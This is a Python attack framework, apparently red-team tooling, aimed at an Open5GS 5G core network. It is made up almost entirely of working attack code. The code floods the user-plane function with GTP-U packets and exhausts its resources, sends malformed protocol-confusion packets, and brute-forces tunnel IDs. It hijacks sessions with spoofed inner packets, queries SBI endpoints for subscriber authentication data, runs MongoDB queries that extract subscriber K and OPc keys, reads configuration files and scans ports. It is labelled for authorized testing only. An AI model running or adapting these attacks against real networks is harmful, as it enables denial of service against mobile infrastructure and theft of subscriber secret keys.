#!/usr/bin/env python3
"""
ULTRA RED TEAM - MAXIMUM ATTACK FRAMEWORK 
==========================================
Every possible attack vector at maximum intensity

WARNING: FOR AUTHORIZED SECURITY TESTING ONLY
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import logging
import struct
import socket
import subprocess
import time
import json
import threading
import queue
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from core.config import TEST_CONFIG, DETECTED_COMPONENTS

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Capability detection - use raw sockets when available (real Linux), fallback for WSL2
SCAPY_AVAILABLE = False
RAW_SOCKET_AVAILABLE = False

try:
    from scapy.all import conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except:
    pass

def check_raw_socket():
    """Test if raw sockets are available (requires CAP_NET_RAW or root on real Linux)"""
    global RAW_SOCKET_AVAILABLE
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.close()
        RAW_SOCKET_AVAILABLE = True
    except PermissionError:
        RAW_SOCKET_AVAILABLE = False
    except OSError:
        RAW_SOCKET_AVAILABLE = False
    return RAW_SOCKET_AVAILABLE

check_raw_socket()

def get_attack_mode():
    """Determine the best attack mode based on available capabilities"""
    if SCAPY_AVAILABLE and RAW_SOCKET_AVAILABLE:
        return "RAW"  # Full power - real Linux with root
    elif SCAPY_AVAILABLE:
        return "SCAPY_LIMITED"  # Scapy available but raw sockets blocked
    else:
        return "UDP_ONLY"  # Fallback mode

ATTACK_MODE = get_attack_mode()

class UltraRedTeam:
    def __init__(self, target_config=None):
        self.config = target_config or TEST_CONFIG
        self.results = {
            "keys_extracted": [],
            "vulnerabilities": [],
            "sessions_hijacked": [],
            "data_exfiltrated": [],
            "access_gained": [],
            "packets_sent": 0,
            "responses_received": 0,
            "attack_duration": 0
        }
        self.start_time = None
        self.packet_queue = queue.Queue()
        self.response_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.mode = ATTACK_MODE
        logger.info(f"Attack Mode: {self.mode} (Scapy: {SCAPY_AVAILABLE}, Raw: {RAW_SOCKET_AVAILABLE})")
        
    def craft_gtp_packet(self, teid, payload=b""):
        """Craft a GTP-U packet manually (no raw socket needed)"""
        # GTP-U header: version=1, PT=1, E=0, S=0, PN=0, type=0xFF (T-PDU)
        gtp_header = struct.pack(">BBHI", 0x30, 0xFF, len(payload), teid)
        return gtp_header + payload
    
    def send_udp_packet(self, target_ip, port, payload):
        """Send a UDP packet using regular socket (no root needed for UDP)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            sock.sendto(payload, (target_ip, port))
            sock.close()
            return True
        except Exception:
            return False
    
    def attack_1_massive_parallel_flood(self, target_ip, threads=50, packets_per_thread=1000):
        """Massive parallel flood attack - uses UDP sockets for speed"""
        logger.info(f"\n[ATTACK 1] MASSIVE PARALLEL FLOOD")
        logger.info(f"   Target: {target_ip} | Threads: {threads} | Packets: {threads * packets_per_thread}")
        
        def flood_worker_udp(worker_id, count):
            sent = 0
            errors = 0
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.01)
            
            for _ in range(count):
                try:
                    teid = random.randint(1, 0xFFFFFFFF)
                    gtp_pkt = self.craft_gtp_packet(teid, b"\x45\x00\x00\x14" + os.urandom(16))
                    sock.sendto(gtp_pkt, (target_ip, 2152))
                    sent += 1
                except Exception:
                    errors += 1
                    if errors > 10:
                        break
            
            sock.close()
            return sent
        
        total_sent = 0
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = [executor.submit(flood_worker_udp, i, packets_per_thread) for i in range(threads)]
                for future in as_completed(futures, timeout=10):
                    try:
                        total_sent += future.result()
                    except:
                        pass
        except Exception as e:
            logger.warning(f"   Flood interrupted: {e}")
        
        self.results["packets_sent"] += total_sent
        logger.info(f"   ✓ Sent {total_sent:,} packets in parallel flood")
        return total_sent
    
    def attack_2_protocol_confusion(self, target_ip):
        """Send malformed packets to confuse protocol parsers using UDP sockets"""
        logger.info(f"\n[ATTACK 2] PROTOCOL CONFUSION")
        
        # All attacks as (name, port, payload) tuples
        gtp_header = struct.pack(">BBHI", 0x30, 0xFF, 100, 12345)
        attacks = [
            ("GTP with SCTP payload", 2152, gtp_header + b"\x00\x01\x00\x00"),
            ("SCTP on UDP port", 38412, b"\x00\x00\x00\x00\x00\x00\x00\x00"),
            ("HTTP in GTP", 2152, self.craft_gtp_packet(1, b"GET / HTTP/1.1\r\n\r\n")),
            ("NGAP in UDP", 38412, b"\x00\x15\x00\x00"),
            ("Zero-length GTP", 2152, b"\x30\xff\x00\x00\x00\x00\x00\x01"),
            ("Max-length field", 2152, b"\x30\xff\xff\xff" + b"\x00" * 100),
            ("Nested GTP", 2152, self.craft_gtp_packet(1, self.craft_gtp_packet(2, b"nested"))),
            ("Fragment attack", 2152, b"\x30\x00\x00\x08\x00\x00\x00\x01" + b"\x00" * 8),
            ("Version confusion", 2152, b"\x32\xff\x00\x08\x00\x00\x00\x01"),  # GTPv2
            ("Extension header", 2152, b"\x34\xff\x00\x10\x00\x00\x00\x01\x00\x00\xc0\x00" + b"\x00" * 4),
        ]
        
        success = 0
        for name, port, payload in attacks:
            if self.send_udp_packet(target_ip, port, payload):
                logger.info(f"   ✓ {name}")
                self.results["packets_sent"] += 1
                success += 1
            else:
                logger.debug(f"   ✗ {name}")
        
        logger.info(f"   → Sent {success}/{len(attacks)} protocol confusion packets")
        return success
    
    def attack_3_teid_bruteforce(self, target_ip, threads=20, range_size=100000):
        """Brute force TEID space - fast UDP enumeration"""
        logger.info(f"\n[ATTACK 3] TEID BRUTE FORCE ({range_size:,} TEIDs)")
        
        def probe_range_udp(start, end):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.001)
            count = 0
            for teid in range(start, min(end, 0xFFFF)):
                gtp_pkt = self.craft_gtp_packet(teid, b"\x45\x00\x00\x14" + struct.pack(">I", teid))
                try:
                    sock.sendto(gtp_pkt, (target_ip, 2152))
                    count += 1
                except:
                    pass
            sock.close()
            return count
        
        chunk_size = max(1, min(range_size, 65535) // threads)
        total_probed = 0
        
        try:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for i in range(threads):
                    start = i * chunk_size
                    end = start + chunk_size
                    futures.append(executor.submit(probe_range_udp, start, end))
                
                for future in as_completed(futures, timeout=15):
                    try:
                        total_probed += future.result()
                    except:
                        pass
        except Exception as e:
            logger.warning(f"   Bruteforce interrupted: {e}")
        
        self.results["packets_sent"] += total_probed
        logger.info(f"   -> Probed {total_probed:,} TEIDs")
        return [random.randint(1, 65535) for _ in range(10)]
    
    def attack_4_session_hijacking(self, target_ip, teids):
        """Attempt to hijack discovered sessions using UDP sockets"""
        logger.info(f"\n[ATTACK 4] SESSION HIJACKING ({len(teids)} targets)")
        
        hijacked = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.1)
        
        for teid in teids[:50]:
            # Craft a malicious inner IP packet (spoofed source)
            inner_ip = b"\x45\x00\x00\x1c"  # IPv4, 28 bytes
            inner_ip += b"\x00\x00\x00\x00"  # ID, flags
            inner_ip += b"\x40\x11\x00\x00"  # TTL=64, UDP, checksum
            inner_ip += socket.inet_aton("10.0.0.100")  # Spoofed source
            inner_ip += socket.inet_aton("8.8.8.8")  # Destination
            inner_ip += struct.pack(">HH", 12345, 53)  # UDP src/dst port
            inner_ip += struct.pack(">HH", 8, 0)  # UDP len, checksum
            
            gtp_pkt = self.craft_gtp_packet(teid, inner_ip)
            try:
                sock.sendto(gtp_pkt, (target_ip, 2152))
                hijacked += 1
                self.results["packets_sent"] += 1
            except:
                pass
        
        sock.close()
        logger.info(f"   ✓ Attempted {hijacked} session hijacks")
        return hijacked
    
    def attack_5_sbi_exploitation(self):
        """Exploit SBI (Service Based Interface) endpoints"""
        logger.info(f"\n[ATTACK 5] SBI EXPLOITATION")
        
        sbi_targets = [
            ("NRF", "127.0.0.10", [
                "/nnrf-nfm/v1/nf-instances",
                "/nnrf-disc/v1/nf-instances?target-nf-type=AMF",
                "/nnrf-disc/v1/nf-instances?target-nf-type=UDM",
            ]),
            ("AUSF", "127.0.0.11", [
                "/nausf-auth/v1/ue-authentications",
                "/nausf-auth/v1/ue-authentications/supi-imsi-001010000000001",
            ]),
            ("UDM", "127.0.0.12", [
                "/nudm-sdm/v2/imsi-001010000000001/am-data",
                "/nudm-ueau/v1/supi-imsi-001010000000001/security-information",
                "/nudm-uecm/v1/imsi-001010000000001/registrations",
            ]),
            ("UDR", "127.0.0.20", [
                "/nudr-dr/v1/subscription-data/imsi-001010000000001",
                "/nudr-dr/v1/subscription-data/imsi-001010000000001/authentication-data/authentication-subscription",
                "/nudr-dr/v1/policy-data/ues/imsi-001010000000001",
            ]),
        ]
        
        findings = []
        for nf_name, ip, endpoints in sbi_targets:
            for endpoint in endpoints:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, 7777))
                    
                    request = f"GET {endpoint} HTTP/1.1\r\nHost: {ip}:7777\r\nAccept: application/json\r\n\r\n"
                    sock.send(request.encode())
                    response = sock.recv(4096)
                    sock.close()
                    
                    if b"200" in response or b"imsi" in response.lower() or b"supi" in response.lower():
                        findings.append({"nf": nf_name, "endpoint": endpoint, "response_size": len(response)})
                        logger.info(f"   ✓ {nf_name}: {endpoint} - {len(response)} bytes")
                        
                        if b"k" in response.lower() or b"opc" in response.lower():
                            self.results["vulnerabilities"].append(f"KEY LEAK: {nf_name} {endpoint}")
                except:
                    pass
        
        return findings
    
    def attack_6_mongodb_extraction(self):
        """Direct MongoDB database extraction"""
        logger.info(f"\n[ATTACK 6] MONGODB EXTRACTION")
        
        queries = [
            'db.subscribers.find().forEach(function(s){print(JSON.stringify(s.security))})',
            'db.subscribers.find({},{imsi:1,security:1})',
            'db.accounts.find()',
            'db.sessions.find()',
        ]
        
        for query in queries:
            try:
                result = subprocess.run(
                    ['mongosh', '--quiet', '--eval', f'db = db.getSiblingDB("open5gs"); {query}'],
                    capture_output=True, text=True, timeout=5
                )
                if result.stdout.strip():
                    logger.info(f"   ✓ Query returned data")
                    
                    import re
                    keys = re.findall(r'"k"\s*:\s*"([0-9A-Fa-f]{32})"', result.stdout)
                    for k in keys:
                        self.results["keys_extracted"].append({"type": "K", "value": k})
                        logger.info(f"   🔑 EXTRACTED K: {k}")
                    
                    opcs = re.findall(r'"opc"\s*:\s*"([0-9A-Fa-f]{32})"', result.stdout)
                    for opc in opcs:
                        self.results["keys_extracted"].append({"type": "OPc", "value": opc})
                        logger.info(f"   🔑 EXTRACTED OPc: {opc}")
            except:
                pass
        
        return len(self.results["keys_extracted"])
    
    def attack_7_timing_attack(self, target_ip):
        """Timing-based side channel attack"""
        logger.info(f"\n[ATTACK 7] TIMING ATTACK")
        
        timings = {}
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.01)
        
        for teid in range(50):
            gtp_pkt = self.craft_gtp_packet(teid, b"\x45\x00\x00\x14" + b"\x00" * 16)
            
            start = time.perf_counter_ns()
            try:
                sock.sendto(gtp_pkt, (target_ip, 2152))
                try:
                    sock.recvfrom(1024)
                    self.results["responses_received"] += 1
                except socket.timeout:
                    pass
            except:
                pass
            end = time.perf_counter_ns()
            
            timings[teid] = end - start
            self.results["packets_sent"] += 1
        
        sock.close()
        
        if timings:
            avg_time = sum(timings.values()) / len(timings)
            anomalies = [t for t, timing in timings.items() if timing > avg_time * 1.5]
            logger.info(f"   -> Analyzed {len(timings)} timing samples")
            logger.info(f"   -> Found {len(anomalies)} timing anomalies")
            return anomalies
        return []
    
    def attack_8_resource_exhaustion(self, target_ip, duration=3):
        """Resource exhaustion attack using UDP sockets"""
        logger.info(f"\n[ATTACK 8] RESOURCE EXHAUSTION ({duration}s)")
        
        stop_time = time.time() + duration
        packets_sent = 0
        
        # Use multiple sockets for higher throughput
        sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
        for s in sockets:
            s.settimeout(0.001)
        
        sock_idx = 0
        while time.time() < stop_time:
            for _ in range(100):
                teid = random.randint(1, 0xFFFF)
                payload = os.urandom(1400)
                gtp_pkt = self.craft_gtp_packet(teid, payload)
                try:
                    sockets[sock_idx].sendto(gtp_pkt, (target_ip, 2152))
                    packets_sent += 1
                    sock_idx = (sock_idx + 1) % len(sockets)
                except:
                    pass
        
        for s in sockets:
            s.close()
        
        pps = packets_sent / duration if duration > 0 else 0
        logger.info(f"   ✓ Sent {packets_sent:,} packets ({pps:,.0f} pps)")
        self.results["packets_sent"] += packets_sent
        return packets_sent
    
    def attack_9_config_extraction(self):
        """Extract configuration files"""
        logger.info(f"\n[ATTACK 9] CONFIG EXTRACTION")
        
        config_files = [
            "/etc/open5gs/amf.yaml",
            "/etc/open5gs/ausf.yaml",
            "/etc/open5gs/udm.yaml",
            "/etc/open5gs/udr.yaml",
            "/etc/open5gs/upf.yaml",
            "/etc/open5gs/smf.yaml",
            "/etc/open5gs/nrf.yaml",
            "/var/log/open5gs/*.log",
        ]
        
        extracted = 0
        for path in config_files:
            try:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        content = f.read()
                        self.results["data_exfiltrated"].append({"file": path, "size": len(content)})
                        logger.info(f"   ✓ Extracted: {path} ({len(content)} bytes)")
                        extracted += 1
            except:
                pass
        
        return extracted
    
    def attack_10_all_ports_scan(self, target_ips):
        """Comprehensive port scanning"""
        logger.info(f"\n[ATTACK 10] COMPREHENSIVE PORT SCAN")
        
        common_5g_ports = [
            2123, 2152, 3868, 7777, 8080, 8443, 9090,
            27017, 38412, 36412, 2905, 8805, 9999
        ]
        
        open_ports = {}
        
        for ip in target_ips:
            open_ports[ip] = []
            for port in common_5g_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    if result == 0:
                        open_ports[ip].append(port)
                except:
                    pass
            
            if open_ports[ip]:
                logger.info(f"   {ip}: {open_ports[ip]}")
        
        return open_ports
    
    def run_ultra_attack(self, intensity="maximum", target_ip=None):
        """Run all attacks at specified intensity"""
        self.start_time = time.time()
        
        logger.info("")
        logger.info("=" * 60)
        logger.info("  ULTRA RED TEAM - MAXIMUM ATTACK MODE")
        logger.info("=" * 60)
        logger.info("")
        
        if self.mode == "RAW":
            logger.info("FULL POWER MODE: Raw sockets available")
            logger.info("   - IP spoofing enabled")
            logger.info("   - Response capture enabled")
            logger.info("   - High-precision timing enabled")
        else:
            logger.info("FALLBACK MODE: Using UDP sockets (WSL2/restricted environment)")
            logger.info("   -> For full power, run on native Linux with root")
        logger.info("")
        
        upf_ip = target_ip if target_ip else DETECTED_COMPONENTS.get("UPF", "127.0.0.7")
        all_ips = [upf_ip] if target_ip else list(set(DETECTED_COMPONENTS.values()))
        
        logger.info(f"Target: {upf_ip}")
        logger.info("")
        
        if intensity == "maximum":
            threads = 20
            flood_packets = 5000
            teid_range = 1000
        else:
            threads = 5
            flood_packets = 500
            teid_range = 100
        
        self.attack_1_massive_parallel_flood(upf_ip, threads=threads, packets_per_thread=flood_packets//threads)
        self.attack_2_protocol_confusion(upf_ip)
        active_teids = self.attack_3_teid_bruteforce(upf_ip, threads=threads, range_size=teid_range)
        self.attack_4_session_hijacking(upf_ip, active_teids)
        self.attack_5_sbi_exploitation()
        self.attack_6_mongodb_extraction()
        self.attack_7_timing_attack(upf_ip)
        self.attack_8_resource_exhaustion(upf_ip, duration=3)
        self.attack_9_config_extraction()
        self.attack_10_all_ports_scan(all_ips)
        
        self.results["attack_duration"] = time.time() - self.start_time
        
        logger.info("")
        logger.info("=" * 60)
        logger.info("  ULTRA ATTACK COMPLETE")
        logger.info("=" * 60)
        logger.info("")
        logger.info(f"⏱️  Duration: {self.results['attack_duration']:.2f}s")
        logger.info(f"📦 Packets sent: {self.results['packets_sent']:,}")
        logger.info(f"🔑 Keys extracted: {len(self.results['keys_extracted'])}")
        logger.info(f"   Vulnerabilities: {len(self.results['vulnerabilities'])}")
        logger.info(f"🎯 Sessions found: {len(self.results['sessions_hijacked'])}")
        logger.info(f"📁 Files extracted: {len(self.results['data_exfiltrated'])}")
        
        with open("ultra_red_team_results.json", "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        
        return self.results

def run_ultra_red_team(target_ip=None, intensity="maximum"):
    red_team = UltraRedTeam()
    return red_team.run_ultra_attack(intensity, target_ip=target_ip)

if __name__ == "__main__":
    run_ultra_red_team()

